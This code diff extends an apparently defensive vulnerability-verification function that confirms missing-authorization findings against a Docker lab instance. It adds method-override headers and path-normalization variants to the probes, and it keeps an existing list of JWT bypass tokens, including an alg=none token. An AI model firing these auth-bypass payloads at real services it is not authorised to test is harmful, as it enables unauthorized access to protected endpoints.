@@ -11257,7 +11257,7 @@ def verify_generic_missing_authorization(
         res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
         return res
 
-    _METHODS_TO_TRY = [http_method.upper(), "GET", "POST", "HEAD", "OPTIONS", "PUT"]
+    _METHODS_TO_TRY = [http_method.upper(), "GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH"]
     _JWT_BYPASSES = [
         "",
         "null",
@@ -11266,6 +11266,26 @@ def verify_generic_missing_authorization(
         "Bearer undefined",
         "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.",  # alg=none
         f"Bearer {_sec.token_hex(32)}",  # random token
+    ]
+    # HTTP method override headers — bypass auth checks gated on request method
+    _METHOD_OVERRIDE_HEADERS = [
+        {"X-HTTP-Method-Override": http_method.upper()},
+        {"X-HTTP-Method": http_method.upper()},
+        {"X-Method-Override": http_method.upper()},
+    ]
+    # Path normalization bypasses — route middleware may not normalize these
+    _ep = endpoint.rstrip("/")
+    _ep_parts = _ep.rsplit("/", 1)
+    _path_variants = [
+        endpoint,
+        endpoint + "/",
+        endpoint + "//",
+        _ep + ";/",
+        _ep + ".json",
+        (_ep_parts[0] + "/" if len(_ep_parts) > 1 else "/")
+        + _ep_parts[-1].upper(),           # uppercase last segment
+        endpoint + "?",
+        endpoint + "%20",
     ]
 
     lab = None
@@ -11277,14 +11297,20 @@ def verify_generic_missing_authorization(
         with lab.running() as boot:
             import requests as _rq
 
-            # --- Phase 1: unauthenticated ---
-            for _m in _METHODS_TO_TRY[:3]:
+            def _probe(url: str, method: str, hdrs: dict) -> Optional[tuple]:
                 try:
-                    r = _rq.request(_m, boot.base_url + endpoint, timeout=10,
+                    r = _rq.request(method, url, headers=hdrs, timeout=10,
                                     allow_redirects=False)
+                    return (r.status_code, r.text or "")
                 except Exception:
+                    return None
+
+            # --- Phase 1: unauthenticated (original method) ---
+            for _m in _METHODS_TO_TRY[:3]:
+                _result = _probe(boot.base_url + endpoint, _m, {})
+                if _result is None:
                     continue
-                body = r.text or ""
+                _status, body = _result
                 if confirm_string and confirm_string in body:
                     res.verified = True
                     res.ok = True
@@ -11292,35 +11318,69 @@ def verify_generic_missing_authorization(
                         "bypass_type": "unauthenticated",
                         "method": _m,
                         "endpoint": endpoint,
-                        "status_code": r.status_code,
+                        "status_code": _status,
                         "respuesta_cuerpo_recorte": body[:400],
                     })
                     step(f"VERIFICADO — missing auth (unauthenticated {_m} {endpoint}): "
                          f"confirm_string '{confirm_string[:30]}' presente")
                     return res
-                if r.status_code in (200, 201, 204) and not confirm_string:
+                if _status in (200, 201, 204) and not confirm_string:
                     # No confirm_string but got 200 — record as suspicious
                     if "unauthorized" not in body.lower() and "forbidden" not in body.lower():
                         res.evidence.update({
                             "bypass_type": "unauthenticated",
                             "method": _m,
                             "endpoint": endpoint,
-                            "status_code": r.status_code,
+                            "status_code": _status,
                             "note": "200 OK without auth and no deny keywords",
                         })
                         step(f"PROBABLE — {_m} {endpoint} devolvió 200 sin auth y sin deny keywords")
 
+            # --- Phase 1b: HTTP method override headers ---
+            for _override_hdr in _METHOD_OVERRIDE_HEADERS:
+                _result = _probe(boot.base_url + endpoint, "POST", _override_hdr)
+                if _result is None:
+                    continue
+                _status, body = _result
+                if confirm_string and confirm_string in body and _status in range(200, 400):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "bypass_type": "method-override",
+                        "header": list(_override_hdr.keys())[0],
+                        "endpoint": endpoint,
+                        "status_code": _status,
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — missing auth via method override "
+                         f"({list(_override_hdr.keys())[0]}): confirm_string presente")
+                    return res
+
+            # --- Phase 1c: path normalization bypass ---
+            for _path_v in _path_variants[1:]:  # skip original (already tried above)
+                _result = _probe(boot.base_url + _path_v, http_method.upper(), {})
+                if _result is None:
+                    continue
+                _status, body = _result
+                if confirm_string and confirm_string in body and _status in range(200, 400):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "bypass_type": "path-normalization",
+                        "path_variant": _path_v,
+                        "status_code": _status,
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — missing auth via path normalization bypass: {_path_v}")
+                    return res
+
             # --- Phase 2: JWT bypass ---
             for _tok in _JWT_BYPASSES:
-                _hdrs: dict = {}
-                if _tok:
-                    _hdrs = {"Authorization": _tok}
-                try:
-                    r = _rq.request(http_method.upper(), boot.base_url + endpoint,
-                                    headers=_hdrs, timeout=10, allow_redirects=False)
-                except Exception:
+                _hdrs: dict = {"Authorization": _tok} if _tok else {}
+                _result = _probe(boot.base_url + endpoint, http_method.upper(), _hdrs)
+                if _result is None:
                     continue
-                body = r.text or ""
+                _status, body = _result
                 if confirm_string and confirm_string in body:
                     res.verified = True
                     res.ok = True
@@ -11328,7 +11388,7 @@ def verify_generic_missing_authorization(
                         "bypass_type": "jwt-bypass",
                         "token_used": _tok[:40] if _tok else "(empty)",
                         "endpoint": endpoint,
-                        "status_code": r.status_code,
+                        "status_code": _status,
                         "respuesta_cuerpo_recorte": body[:400],
                     })
                     step(f"VERIFICADO — missing auth via JWT bypass "
